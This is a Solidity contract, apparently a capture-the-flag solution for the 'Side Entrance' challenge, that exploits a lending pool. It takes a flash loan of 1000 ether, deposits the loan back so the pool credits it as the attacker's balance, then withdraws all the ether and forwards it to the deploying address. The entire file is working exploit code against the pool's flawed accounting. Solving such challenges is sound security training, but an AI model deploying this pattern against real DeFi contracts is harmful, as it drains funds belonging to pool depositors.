// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title Attacker
 * @author kyrers
 * @notice This contract inherits the needed interface and executes the full attack. We just need to call the attack function.
 */

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    address payable private immutable attacker;
    SideEntranceLenderPool private immutable pool;

    constructor(address _pool) {
        attacker = payable(msg.sender);
        pool = SideEntranceLenderPool(_pool);
    }

    /**
    * @notice Launches the attack by first executing the maximum flashloan possible and after receiving it, in the execute function, withdraws all our ether.
    */
    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
    }

    /**
    * @notice This is the function that the pool uses to send the flashloan. In here we just deposit the full flashloan back into the contract, which pays the pool back while setting those funds as ours.
    * Now we can withdraw all our deposited ether from the pool.
    */
    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    /**
    * @notice Receives the withdrawn ether and transfers it to the attacker.
    */
    receive () external payable {
        attacker.transfer(msg.value);
    }
}
